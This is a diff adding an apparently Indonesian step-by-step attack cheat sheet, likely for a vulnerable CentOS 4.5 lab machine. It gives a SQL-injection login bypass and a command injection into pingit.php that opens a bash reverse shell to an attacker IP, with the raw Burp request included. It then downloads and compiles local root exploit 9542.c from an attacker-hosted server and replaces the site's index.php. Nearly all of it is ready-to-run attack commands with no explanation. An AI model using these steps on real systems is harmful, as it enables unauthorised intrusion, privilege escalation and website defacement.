@@ -1,0 +1,55 @@
+Persiapan 
+
+  Terminal 1
+    searchsploit centos 4.5 
+    searchsploit -m linux_x86/local/9542.c
+    python -m http.server 80
+
+
+  Terminal 2 or Terminal Server
+	  ifconfig
+    nc -lnvp 1234
+
+Mulai
+  Terminal 3
+	  sudo netdiscover
+
+
+  Open Web 
+	  username = 'or 1=1--
+	  password = 'or 1=1--
+	  uname=%27or+1%3D1--&psw=%27or+1%3D1--&btnLogin=Login
+
+  Administrative Web Console
+	  ;bash -i >& /dev/tcp/192.168.4.x/1234 0>&1
+	  ip=%3Bbash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.4.x%2F1234+0%3E%261&submit=submit
+	
+	
+  Terminal 2 or Terminal Server
+	  lsb_release -a
+	  cd /tmp && wget 192.168.4.x:80/9542.c && gcc 9542.c -o aung && ./agung
+    cd /tmp && wget 192.168.4.x:80/tmp/tmp.c && gcc tmp.c -o tmp && ./tmp 
+	
+	  cd /var/www/html && rm index.php && wget 192.168.6.5:80/index.php
+
+
+Burpsite
+
+POST /pingit.php HTTP/1.1
+Host: 192.168.3.251
+Content-Length: 17
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
+Origin: http://192.168.3.251
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.3.251/index.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+ip=%3Bbash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.4.x%2F1234+0%3E%261&submit=submit
+	
+
+	
